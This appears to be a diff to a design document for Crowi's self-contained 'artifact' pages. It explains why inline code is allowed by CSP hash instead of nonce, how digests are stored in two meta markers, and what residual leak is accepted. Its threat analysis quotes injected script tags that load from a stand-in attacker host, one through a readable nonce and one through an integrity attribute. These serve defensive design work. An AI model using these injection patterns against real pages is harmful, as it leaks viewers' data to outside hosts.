@@ -160,7 +160,22 @@ The two font origins in brackets are present only when the web-font setting is e
 
 **Inline code is authorised by hash, not by nonce.** An earlier draft used a per-revision nonce: ingest generated one, injected it onto every accepted inline `<script>` and `<style>`, and recorded it in a reserved `<meta>` so delivery could emit `script-src 'nonce-…'` without reparsing the body. That design is unsound, and the flaw is fatal rather than incidental. A nonce authorises *an element that carries it*, whatever that element loads; and the nonce has to be readable, because it sits in the served bytes. An accepted inline script can therefore read it and append `<script nonce="…" src="https://attacker.example/x.js">`, which the policy then authorises. Every external reference this design rejects at ingest becomes reachable at runtime, which empties the self-contained guarantee of its meaning.
 
-A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records the set in the reserved `<meta>`; delivery reads that marker and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves.
+A hash has no such property. `'sha256-…'` matches one exact body of inline code and nothing else, so an attacker-authored element — external or inline — matches no hash and does not run. Ingest computes the digest of each accepted inline block and records it in a reserved `<meta>`; delivery reads those markers and emits the hashes, still serving the stored bytes unchanged. No attribute is injected onto the blocks themselves.
+
+One residual remains, and it is accepted rather than closed. CSP Level 3 lets a hash-source in `script-src` also match an *external* `<script>` whose `integrity` attribute carries the same hash, and the policy must not rely on browsers declining to implement that. An accepted inline script can therefore append `<script src="https://attacker.example/x.js" integrity="sha256-<its own digest>">` at runtime, and the browser issues that request even under `connect-src 'none'`. Subresource integrity then refuses to run anything but the identical bytes, so no new code executes; what escapes is the request itself, with whatever the script encoded into the URL and the viewer's IP and user agent. No directive closes this path: a nonce is readable by the script that carries it and is strictly weaker, and Trusted Types would break most existing libraries. It is accepted because it takes a deliberately hostile author, exposes only what the artifact itself already knows, cannot reach the Crowi session or API, and is no worse than what an ordinary Markdown page can already do with an external image.
+
+**The digests are recorded per kind, in two markers.** Ingest appends both to the end of `head`:
+
+```html
+<meta name="crowi-artifact-script-digests-v1" content="sha256-… sha256-…">
+<meta name="crowi-artifact-style-digests-v1"  content="sha256-…">
+```
+
+Each `content` holds the base64 SHA-256 of every accepted inline block of that kind, in tree order, space-separated, covering both the HTML and the SVG namespace. A kind with no accepted blocks still gets its marker, with an empty `content`, so delivery never has to branch on a marker's absence.
+
+Splitting by kind is what makes the policy above emittable. `script-src` and `style-src` are separate directives, so delivery needs to know which hash belongs to which. A single mixed list would leave two options, and both are unacceptable: putting every hash in both directives lets a style digest authorise a script, which gives back exactly the property the move away from nonces was meant to remove; re-parsing the body at delivery time discards the reason for recording the digests at ingest at all. Two markers let delivery pass each `content` straight into its matching directive, with no parsing beyond splitting on spaces.
+
+The `v1` suffix names the format, not the artifact. These markers are part of the stored bytes, so a later format needs a new name and a re-ingest of anything already stored under the old one.
 
 The change also removes a defect in the authoring loop. With a nonce, the served bytes carried a value the author was forbidden to send back, so the ordinary fetch–edit–save cycle over MCP or the CLI failed on every attempt. Hashes are derived from content, so ingest simply discards any reserved marker on input and recomputes it: a forged marker is not a threat to be rejected, it is a value about to be overwritten.
 
@@ -202,8 +217,6 @@ The list row already has a vocabulary for this, and it distinguishes two things.
 The glyph is `layout-freeform`. What separates an artifact from a Markdown page, for someone about to click it, is that it composes its own layout: a Markdown page is always the same single column, and an artifact is whatever it arranges itself to be. That is the quality the icon should carry.
 
 Glyphs shaped like documents — a book, a scroll — were passed over because every page is a document, so they distinguish nothing. Glyphs describing the mechanism, such as circuitry for "scripts run here", do distinguish, but on a wiki they can be read as describing the page's *subject* rather than its kind; the neighbouring compass, link and lock have no such ambiguity, because each of them names what the page is rather than how it works.
-
-`layout-freeform` was added in lucide 1.27, and the codebase is on 0.x. **Phase 4 therefore depends on the lucide major upgrade**, or must ship an interim glyph and swap it afterwards. This is a scheduling constraint rather than a design one, but it should not be discovered during implementation.
 
 ### Delivery: embedding
 
